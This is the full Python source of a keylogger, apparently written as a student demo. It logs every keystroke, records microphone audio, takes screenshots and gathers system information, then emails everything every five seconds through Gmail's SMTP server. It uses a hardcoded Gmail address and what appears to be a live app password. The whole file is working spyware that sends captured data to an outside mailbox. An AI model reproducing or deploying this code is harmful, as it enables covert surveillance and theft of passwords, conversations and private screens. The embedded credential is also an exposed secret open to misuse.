import smtplib
import threading
import wave
import sounddevice as sd
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import pyscreenshot
import numpy as np
import socket
import platform

EMAIL_ADDRESS = "keyloggerdemo12@gmail.com"    # Your Gmail address
EMAIL_PASSWORD = "refp oqcy dhdd hkrn"         # Your Gmail App Password
SEND_REPORT_EVERY = 5                          # Time interval in seconds

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log = self.log + string

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "
        self.appendlog(current_key)

    def send_mail(self, email, password, message, audio_file=None, screenshot_file=None):
        sender = f"Ryan Yen <{EMAIL_ADDRESS}>"
        receiver = "Logan Wilmoth <keyloggerdemo12@gmail.com>"

        msg = MIMEMultipart()
        msg['Subject'] = "Keylogger Report"
        msg['From'] = sender
        msg['To'] = receiver

        body = "Keylogger by Logan Wilmoth, Ryan Yen, and Julian Frank\n\n" + message
        msg.attach(MIMEText(body, 'plain'))

        if audio_file:
            with open(audio_file, 'rb') as f:
                part = MIMEBase('audio', 'wav')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment; filename="sound.wav"')
                msg.attach(part)

        if screenshot_file:
            with open(screenshot_file, 'rb') as f:
                part = MIMEBase('image', 'png')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment; filename="screenshot.png"')
                msg.attach(part)

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(email, password)
            server.sendmail(sender, receiver, msg.as_string())

    def record_audio(self):
        fs = 44100
        seconds = SEND_REPORT_EVERY
        channels = 1
        # print("Available audio devices:", sd.query_devices())
        # print("Default input device:", sd.default.device[0])
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=channels, dtype='int16')
        sd.wait()
        with wave.open('sound.wav', 'wb') as obj:
            obj.setnchannels(channels)
            obj.setsampwidth(2)
            obj.setframerate(fs)
            obj.writeframes(myrecording.tobytes())
        return 'sound.wav'

    def take_screenshot(self):
        img = pyscreenshot.grab()
        img.save("screenshot.png")
        return 'screenshot.png'

    def system_information(self):
        hostname = socket.gethostname()
        # ip = socket.gethostbyname(hostname)
        processor = platform.processor()
        system = platform.system()
        machine = platform.machine()
        return (
            f"System Information:\n"
            f"Hostname: {hostname}\n"
            # f"IP: {ip}\n"
            f"Processor: {processor}\n"
            f"OS: {system}\n"
            f"Machine: {machine}"
        )

    def report(self):
        audio_file = self.record_audio()
        screenshot_file = self.take_screenshot()
        sys_info = self.system_information()
        full_message = f"{sys_info}\n\nKeystrokes:\n{self.log}"
        self.send_mail(self.email, self.password, full_message, audio_file=audio_file, screenshot_file=screenshot_file)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()